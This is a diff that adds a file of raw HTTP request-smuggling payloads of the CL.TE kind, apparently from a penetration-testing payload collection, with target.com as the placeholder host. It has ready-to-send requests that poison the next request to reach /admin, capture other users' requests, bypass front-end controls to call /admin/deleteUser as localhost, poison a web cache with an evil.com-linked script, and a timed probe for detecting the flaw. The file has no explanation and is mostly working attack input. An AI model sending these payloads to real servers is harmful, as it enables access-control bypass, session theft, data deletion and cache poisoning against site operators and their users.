@@ -1,0 +1,77 @@
+# ============================================================
+# Request Smuggling — CL.TE (Frontend: Content-Length, Backend: Transfer-Encoding)
+# ============================================================
+
+# ---- Basic CL.TE ----
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED
+
+# ---- CL.TE — Poison Next Request ----
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 49
+Transfer-Encoding: chunked
+
+e
+q=smuggled&x=
+0
+
+GET /admin HTTP/1.1
+X-Ignore: X
+
+# ---- CL.TE — Capture Next Request ----
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 116
+Transfer-Encoding: chunked
+
+0
+
+POST / HTTP/1.1
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 200
+
+search=
+
+# ---- CL.TE — Bypass Front-End Controls ----
+POST /admin/deleteUser HTTP/1.1
+Host: target.com
+Content-Length: 67
+Transfer-Encoding: chunked
+
+0
+
+GET /admin/deleteUser HTTP/1.1
+Host: localhost
+Content-Length: 5
+
+x=1
+
+# ---- CL.TE — Web Cache Poisoning ----
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 57
+Transfer-Encoding: chunked
+
+0
+
+GET /static/evil.js HTTP/1.1
+X-Forwarded-For: evil.com
+
+# ---- CL.TE — Detection (timed) ----
+# If vulnerable, second request will be delayed (11 seconds)
+POST / HTTP/1.1
+Host: target.com
+Transfer-Encoding: chunked
+Content-Length: 4
+
+1
+A
+X
